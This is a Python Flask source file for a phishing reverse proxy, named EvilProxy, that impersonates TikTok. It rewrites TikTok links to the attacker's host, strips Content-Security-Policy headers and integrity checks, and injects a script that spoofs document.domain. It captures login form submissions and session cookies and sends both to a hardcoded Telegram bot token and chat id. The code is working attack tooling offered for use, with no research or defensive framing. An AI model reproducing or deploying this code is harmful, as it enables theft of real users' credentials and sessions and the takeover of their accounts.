import os, re, json, urllib3, requests
from flask import Flask, request, make_response, redirect
from urllib.parse import urljoin
from werkzeug.middleware.proxy_fix import ProxyFix

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

a = Flask(__name__)
a.wsgi_app = ProxyFix(a.wsgi_app, x_for=1, x_proto=1, x_host=1, x_prefix=1)


T = "8554468568:AAFvQJVSo6TtBao6xreo_Zf1DxnFupKVTrc"
C = "1367401179"

class EvilProxy:
    def __init__(self):
        self.target = "www.tiktok.com"
       
        self.domains = ["www.tiktok.com", "tiktok.com", "m.tiktok.com", "v16m.tiktokcdn.com"]

    def notify(self, m):
        try: requests.post(f"https://api.telegram.org/bot{T}/sendMessage", json={"chat_id": C, "text": m, "parse_mode": "HTML"})
        except: pass

    def bypass_filters(self, content, host):
      
        for d in self.domains:
            content = content.replace(f"https://{d}", f"https://{host}")
            content = content.replace(f"//{d}", f"//{host}")
        
        
        content = content.replace('Content-Security-Policy', 'X-Proxy-CSP')
        content = re.sub(r'integrity="[^"]+"', '', content)
        
        
        if '<head>' in content:
            script = f"""
            <script>
                window.addEventListener('load', function() {{
                    // م
                    Object.defineProperty(document, 'domain', {{get: function() {{return '{self.target}';}}}});
                }});
            </script>
            """
            content = content.replace('<head>', f'<head>{script}')
        return content

proxy = EvilProxy()

@a.route('/', defaults={'path': ''})
@a.route('/<path:path>', methods=['GET', 'POST', 'PUT', 'DELETE', 'PATCH'])
def handle_request(path):
    host = request.headers.get('Host')
    url = urljoin(f"https://{proxy.target}", path)
    if request.query_string:
        url += '?' + request.query_string.decode()

    
    headers = {k: v for k, v in request.headers if k.lower() not in ['host', 'accept-encoding', 'content-length']}
    headers['Host'] = proxy.target
    headers['Referer'] = f"https://{proxy.target}/"

    
    if request.method == 'POST':
        payload = request.get_data(as_text=True)
        if any(key in payload.lower() for key in ['pass', 'user', 'login', 'email']):
            proxy.notify(f"🎯 <b>Captured Credentials:</b>\n<code>{payload[:1500]}</code>")

    try:
        
        response = requests.request(
            method=request.method,
            url=url,
            headers=headers,
            cookies=request.cookies,
            data=request.get_data(),
            allow_redirects=False,
            verify=False
        )

        content = response.content
        if 'text/html' in response.headers.get('Content-Type', ''):
            content = proxy.bypass_filters(content.decode('utf-8', errors='ignore'), host).encode()

        res = make_response(content)
        res.status_code = response.status_code

        
        for k, v in response.cookies.items():
            
            res.set_cookie(k, v, secure=True, httponly=True, samesite='None', domain=None)

        
        if 'sessionid' in response.cookies:
            full_session = "; ".join([f"{k}={v}" for k, v in response.cookies.items()])
            proxy.notify(f"🔥 <b>GOLDEN SESSION CAPTURED!</b>\n<code>{full_session}</code>")

        
        if response.status_code in [301, 302, 303]:
            loc = response.headers.get('Location', '').replace(proxy.target, host)
            res.headers['Location'] = loc

        return res

    except Exception as e:
        return f"Proxy Error: {str(e)}", 500

if __name__ == '__main__':
    a.run(host='0.0.0.0', port=int(os.environ.get('PORT', 10000)))
